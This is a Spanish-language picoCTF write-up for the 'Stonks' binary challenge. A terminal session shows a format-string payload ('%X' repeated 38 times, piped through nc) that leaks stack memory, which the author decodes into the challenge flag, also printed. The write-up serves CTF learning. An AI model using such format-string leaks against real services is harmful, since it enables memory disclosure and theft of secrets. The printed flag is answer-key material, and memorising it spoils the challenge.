# Stonks

## Descripcion Reto
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/fdf270d959fa5231e180e2bd11421d0c/vuln.c) `nc mercury.picoctf.net 16439`

## Pistas
1. Okay, maybe I'd believe you if you find my API key.

## Solución
```bash
┌──(kali㉿kali)-[~/hacking/picoBinary/stonks]
└─$ ls -la
total 4
drwxrwx--- 1 root vboxsf    0 may 14 20:05 .
drwxrwx--- 1 root vboxsf    0 may 14 20:04 ..
-rwxrwx--- 1 root vboxsf 2744 mar 15  2021 vuln.c

┌──(kali㉿kali)-[~/hacking/picoBinary/stonks]
└─$ nc mercury.picoctf.net 16439   
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
a
Buying stonks with token:
a
Portfolio as of Mon May 15 02:19:20 UTC 2023


1 shares of B
2 shares of SC
12 shares of K
5 shares of BM
7 shares of HRT
19 shares of I
11 shares of AW
553 shares of O
101 shares of WT
Goodbye!

┌──(kali㉿kali)-[~/hacking/picoBinary/stonks]
└─$ python -c "print(1, '%X'*38)" | nc mercury.picoctf.net 16439
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
Buying stonks with token:
929D370804B00080489C3F7F3BD80FFFFFFFF1929B160F7F49110F7F3BDC70929C1806929D350929D3706F6369707B465443306C5F49345F74356D5F6C6C306D5F795F79336E6263376365616336FFF9007DF7F76AF8F7F49440C3A9500010F7DD8CE9F7F4A0C0F7F3B5C0F7F3B000FFF93928F7DC968DF7F3B5C08048ECAFFF93934
Portfolio as of Mon May 15 02:23:59 UTC 2023


6 shares of IYRN
288 shares of AZ
918 shares of QBY
413 shares of GLE
Goodbye!

        
```

De los valores dados en hexadecimal decidimos decodificarlos y cambiar la posicion de los valores para poder encontrar la badera.

![[Pasted image 20230514213116.png]]

## Bandera
* picoCTF{I_l05t_4ll_my_m0n3y_c7cb6cae}

## Notas adicionales
| Comando | Descripcion |
|---------|-------------|
|  |  |

## Referencias
- []()